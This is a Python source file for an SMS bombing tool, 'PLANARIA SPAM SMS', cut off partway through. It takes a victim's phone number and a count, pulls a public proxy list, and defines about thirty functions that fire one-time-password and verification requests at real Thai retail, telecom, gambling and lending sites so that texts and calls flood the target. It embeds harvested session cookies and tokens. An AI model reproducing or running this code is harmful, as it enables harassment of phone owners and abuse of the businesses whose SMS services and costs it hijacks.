from os import system
from requests import get
import string
from colorama import Fore
import asyncio
from bs4 import BeautifulSoup
from pystyle import Colors, Colorate
from re import search
from secrets import token_hex
import requests, threading, os
from os import system
from time import sleep
from requests import Session
from httpx import get
from colorama import Fore
from time import sleep
from requests import get
from subprocess import check_output
from os import system
from httpx import Client
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from sys import stdout
from json import dumps, loads
from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile, isdir
from py_compile import compile
from os import listdir, mkdir, remove, rmdir, rename, chdir, name
from shutil import move, copy, rmtree
from time import sleep
from binascii import hexlify
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from operator import truediv
from httpx import Client
from requests import get
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from subprocess import check_output
import httpx
import requests as ru
import itertools
import threading
import requests
import time
import random
import datetime
import pystyle
import gratient
from time import sleep
from pystyle import Colors, Colorate, Anime, Write
from requests import Session
from re import search
from concurrent.futures import ThreadPoolExecutor
from pystyle import Colors, Colorate
import random
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session, post, get
import threading
import time
import random
import os
import datetime
import sys
import asyncio
from re import search
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session, post, get
from pystyle import Colors, Colorate
from colorama import Fore
import subprocess
import sys
import time
import subprocess
import sys
import time

threading = ThreadPoolExecutor(max_workers=int(100000000))
headers = {
  "user-agent":
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
header = {
  "user-agent":
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
headers = {
  "user-agent":
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
proxy = requests.get(
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
).text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()

os.system("cls & title PLANARIASPAMSMS")


def now():
  now = datetime.now()
  nownow = now.strftime("%H:%M:%S")
  return nownow


format_one = 0
format_two = 0
format_tre = 0

loop_types = 1


def receive_color():
  global format_one, format_two, format_tre, loop_types

  for types1, types2, types3, number in zip([1, 0], [0, 1], ['+', '-'],
                                            [255, 0]):
    if (loop_types == types1):
      if (format_one != number):
        exec(f'format_one {types3}= 15', globals())

      if (format_one == number):
        if (format_two != number):
          exec(f'format_two {types3}= 15', globals())

      if (format_two == number):
        if (format_tre != number):
          exec(f'format_tre {types3}= 15', globals())

      if (format_tre == number):
        loop_types = types2

  return f"\033[38;2;{format_one};{format_two};{format_tre}m"


def PLANARIA():
  print(
    gratient.blue(f""""""))

  phone = sys.argv[1]
  phone = phone
  amount = sys.argv[2]
  amount = amount
  print()
  print()
  smsapixx(phone, amount)


def smsapixx1(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API TRUECORP SEND SMS TO {phone} SUCSESS")


def smsapixx2(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post("https://openapi.bigc.co.th/customer/v1/otp",
                    json={"phone_no": f"{phone}"},
                    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API BIGC SEND SMS TO {phone} SUCSESS")


def smsapixx3(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",
                    data={
                      "applicant": phone,
                      "serviceName": "fox888.com"
                    },
                    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API FOX83 SEND SMS TO {phone} SUCSESS")


def smsapixx4(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://topping.truemoveh.com/api/get_request_otp",
    data=f"mobile_number={phone}",
    headers={
      "Accept":
      "application/json, text/plain, /",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded",
      "Referer":
      "https://topping.truemoveh.com/otp?callback=/campaign/104",
      "Cookie":
      "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API TRUEMOVEH SEND SMS TO {phone} SUCSESS")


def smsapixx5(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api2.1112.com/api/v1/otp/create",
    json={
      "phonenumber": phone,
      "language": "th"
    },
    headers={
      "accept":
      "application/json, text/plain, /",
      "user-agent":
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(receive_color() + f'[{now()}] {phone} FAST SLEEP')


def smsapixx6(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post("https://api-sso.ch3plus.com/user/request-otp",
                    json={
                      "tel": f"{phone}",
                      "type": "login"
                    },
                    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API 3PLUS SEND SMS TO {phone} SUCSESS")


def smsapixx7(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.vegas77slots.com/auth/send_otp",
    data=
    f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",
    headers={
      "content-type": "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API 77SLOTS SEND SMS TO {phone} SUCSESS")


def smsapixx8(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://service-api.auto1.co.th/w/user/request-otp-on-register",
    json={
      "ConsentFlag": "true",
      "AcceptPolicy": "true",
      "Tel": phone,
      "OTPId": "",
      "OTP1": "",
      "OTP2": "",
      "OTP3": "",
      "OTP4": "",
      "OTP5": "",
      "OTP6": "",
      "Email": "",
      "Pin1": "",
      "Pin2": "",
      "Pin3": "",
      "Pin4": "",
      "Pin5": "",
      "Pin6": "",
      "PinConfirm1": "",
      "PinConfirm2": "",
      "PinConfirm3": "",
      "PinConfirm4": "",
      "PinConfirm5": "",
      "PinConfirm6": "",
      "FirstName": "",
      "LastName": ""
    },
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API AUTO1 SEND SMS TO {phone} SUCSESS")


def smsapixx9(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://cognito-idp.ap-southeast-1.amazonaws.com/",
    headers={
      "cache-control": "max-age=0",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
      "content-type": "application/x-amz-json-1.1",
      "x-amz-target":
      "AWSCognitoIdentityProviderService.ResendConfirmationCode",
      "x-amz-user-agent": "aws-amplify/0.1.x js",
      "referer": "https://www.bugaboo.tv/members/resetpass/phone"
    },
    json={
      "ClientId": "6g47av6ddfcvi06v4l186c16d6",
      "Username": f"+66{phone[1:]}"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API COGNITO SEND SMS TO {phone} SUCSESS")


def smsapixx10(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(f"https://kamuishop.online/kamuiapi/phone/{phone}")
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API KAMUISHOP SEND SMS TO {phone} SUCSESS")


def smsapixx11(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
    f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",
    headers={
      "authorization":
      "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API NOCNOC SEND SMS TO {phone} SUCSESS")


def smsapixx12(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
    f"https://app.iship.cloud/api/ant/request-otp/{phone}",
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
      "cookie":
      "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API ISHIP SEND SMS TO {phone} SUCSESS")


def smsapixx13(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://m-api.hhh-st1.xyz/api/otp/register",
    headers={
      "content-type":
      "application/json",
      "accept":
      "application/json, text/plain, */*",
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
    },
    json={
      "applicant": phone,
      "serviceName": "hihuay.com"
    })
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API HHHST1 SEND SMS TO {phone} SUCSESS")


def smsapixx14(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.beauticool.com/?m=request_otp",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "cookie":
      "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0",
      "x-requested-with": "XMLHttpRequest"
    },
    data=f"tel={phone}",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API BEAUTICOOL SEND SMS TO {phone} SUCSESS")


def smsapixx15(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.put(
    f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",
    headers={
      "content-type":
      "application/json;charset=UTF-8",
      "accept":
      "application/json, text/plain, */*",
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
    },
    json={"method": "register"},
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API XN SEND SMS TO {phone} SUCSESS")


def smsapixx16(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api.giztix.com/graphql",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
    },
    json={
      "operationName":
      "OtpGeneratePhone",
      "variables": {
        "phone": f"66{phone[1:]}"
      },
      "query":
      "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API GIZTIX SEND SMS TO {phone} SUCSESS")


def smsapixx17(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
    data={"mobile_phone_no": phone},
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API LOTUSS SEND SMS TO {phone} SUCSESS")


def smsapixx18(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post("https://mapi.dung919.com/api/otp/register",
                    json={
                      "applicant": f"{phone}",
                      "serviceName": "dung919.com"
                    },
                    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API MAPI SEND SMS TO {phone} SUCSESS")


def smsapixx19(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api.cmtrade.com/api/v2/account/sms/code",
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
      "cookie":
      "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "accept": "application/json, text/javascript, */*; q=0.01"
    },
    data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API CMTRADE SEND SMS TO {phone} SUCSESS")


def smsapixx20(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.carsome.co.th/website/login/sendSMS",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "cookie":
      "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"
    },
    json={
      "username": phone,
      "optType": 0
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API CARSOME SEND SMS TO {phone} SUCSESS")


def smsapixxcall21(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://1ufa.bet/_ajax_/request-otp",
    data={
      "request_otp[phoneNumber]": f"{phone}",
      "request_otp[termAndCondition]": "1",
      "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"
    },
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded",
      "cookie":
      "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API 1UFA SEND CALL TO {phone} SUCSESS")


def smsapixx22(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api2.1112.com/api/v1/otp/create",
    headers={
      "content-type":
      "application/json;charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    },
    json={
      "phonenumber": phone,
      "language": "th"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API 1112 SEND SMS TO {phone} SUCSESS")


def smsapixx23(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = get(
    f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API BKK SEND SMS TO {phone} SUCSESS")


def smsapixx24(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="
    + phone + "&img_code=",
    headers={
      "Host": "api.quickcash8.com",
      "Connection": "Keep-Alive",
      "Accept": "gzip",
      "User-Agent": "okhttp/3.11.0"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API QUICK SEND SMS TO {phone} SUCSESS")


def smsapixx25(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api.true-shopping.com/customer/api/request-activate/mobile_no",
    data={"username": phone},
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API TRUESHPPING SEND SMS TO {phone} SUCSESS")


def smsapixx26(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://login.s-momclub.com/accounts.otp.sendCode",
    data=
    f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",
    headers={
      "content-type":
      "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "cookie":
      "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API MOMCLUB SEND SMS TO {phone} SUCSESS")


def smsapixx27(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",
    json={"phoneNumber": "+66" + phone},
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API POINTSPOT SEND SMS TO {phone} SUCSESS")


def smsapixx28(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://api.freshket.co/baseApi/Users/RequestOtp",
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "Content-Type": "application/json;charset=UTF-8"
    },
    json={
      "isDev": "false",
      "language": "th",
      "phone": f"+66{phone[1:]}"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API FRESHKET SEND SMS TO {phone} SUCSESS")


def smsapixx29(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",
    headers={
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"
    },
    data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API PYGW SEND SMS TO {phone} SUCSESS")


def smsapixx30(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
    f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',
    headers={
      "accept":
      "application/json, text/javascript, */*; q=0.01",
      "x-requested-with":
      "XMLHttpRequest",
      "user-agent":
      generate_user_agent(),
      "cookie":
